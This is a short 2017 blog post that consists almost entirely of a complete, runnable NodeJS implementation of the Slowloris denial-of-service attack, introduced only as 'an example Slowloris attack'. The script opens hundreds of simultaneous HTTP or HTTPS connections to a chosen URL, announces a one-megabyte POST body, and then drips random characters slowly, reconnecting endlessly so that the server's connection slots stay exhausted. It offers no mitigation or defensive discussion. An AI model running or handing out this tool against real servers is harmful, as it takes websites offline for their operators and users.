---
layout: post
title:  "NodeJS Slowloris Implementation"
date:   2017-03-23 00:00:00 -0600
categories: nodejs javascript slowloris
author: Nicholas Starke
---

This is an example Slowloris attack implemented in NodeJS.

```javascript
// run "npm i commander" to install necessary dependencies
var net = require('net');
var tls = require('tls');
var url = require('url');
var util = require('util');

var commander = require('commander');

commander.option('-u, --url [url]', 'Url to hit')
          .option('-c, --connections [connections]', 'Connections to use simultaneously', 256, parseInt)
          .option('-t, --timings [timings]', 'Which set of timings to use', 'default')
          .option('-s, --start [start]', 'Start Up Interval', 500, parseFloat)
          .option('-d, --debug', 'Debug mode')
          .parse(process.argv);

var url = url.parse(commander.url);

var secure = url.protocol === 'https:';

var socket = secure ? tls.TLSSocket : net.Socket;

var connLimit = commander.connections;

var timings = {
  default: {
    restart: 300,
    error: 300,
    end: 300,
    heartbeat: function(){
      return (1000 * (100 + (Math.floor(Math.random() * 10))));
    },
    iterations: 1
  },
  antiTimeout: {
    restart: 300,
    error: 300,
    end: 300,
    heartbeat: function(){
      return 900 + Math.floor(Math.random() * 100);
    },
    iterations: 501
  }
};

var currentTimings = timings[commander.timings];

if (!currentTimings) {
  console.error('You must set a valid timings.  Use "default" if you are unsure.');
  process.exit(1);
}

var ALPHANUMERIC = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

var start = new Date();
console.log(util.format('Starting at %s', start));

function connectionHandler(){

  var client = new socket();

  var charCounter = 0;

  var charLimit = 1024 * 1024;

  client.connect({
    port: url.port || secure ? 443 : 80,
    host: url.hostname
  }, function(){

    if (commander.debug) console.log(util.format('Beginning Request at %s', new Date()));

    var header = util.format('POST / HTTP/1.1\r\nHost: %s\r\nContent-length: %s\r\nKeep-alive: timeout=10, max=5\r\n\r\n', url.hostname, charLimit);
    client.write(header);

    function sendData(){

      if (charCounter >= charLimit) {

        if (commander.debug) console.log(util.format('Ending Request at %s', new Date()));

        client.write('\r\n');
        client.end();
        setTimeout(connectionHandler, currentTimings.restart);
        return;
      }

      if (client.bufferSize < (currentTimings.iterations * 2)) {
        var stringToSend = '';

        for (var i = 0; i < currentTimings.iterations; i++){
          var charToSend = ALPHANUMERIC[Math.floor(Math.random() * ALPHANUMERIC.length)];
          stringToSend += charToSend;
        }

        if (stringToSend.length + charCounter > charLimit) {
          stringToSend = stringToSend.substring(0, charLimit - (stringToSend.length + charCounter));
        }

        client.write(stringToSend);
        charCounter = charCounter + stringToSend.length;

        setTimeout(sendData, currentTimings.heartbeat());
      } else {

        if (commander.debug) console.log(util.format('Draining Request at %s', new Date()));

        return client.once('drain', sendData);
      }
    }

    setTimeout(sendData, currentTimings.heartbeat());
  });

  client.on('error', function(err){

    if (commander.debug) console.log(util.format('Error Request at %s - Error: %s', new Date(), err.errno));

    client.end();
    setTimeout(connectionHandler, currentTimings.error);
  });

  client.on('end', function(){

    if (commander.debug) console.log(util.format('End Request at %s', new Date()));

    setTimeout(connectionHandler, currentTimings.end);
  });
}

var connCounter = 0;

function startUp(){
  if (connCounter < connLimit){
    connectionHandler();
    setTimeout(startUp, commander.start);
    connCounter++;
  } else {
    var allUp = new Date();
    console.log(util.format('All connection workers fired up at %s - Took %s seconds', allUp, (allUp - start) / 1000));
  }
}

setTimeout(startUp, commander.start);

process.on('SIGINT', function(){
  var end = new Date();
  console.log(util.format('Attack Complete at %s - Took %s seconds', end, (end - start) / 1000));
  process.exit();
});
```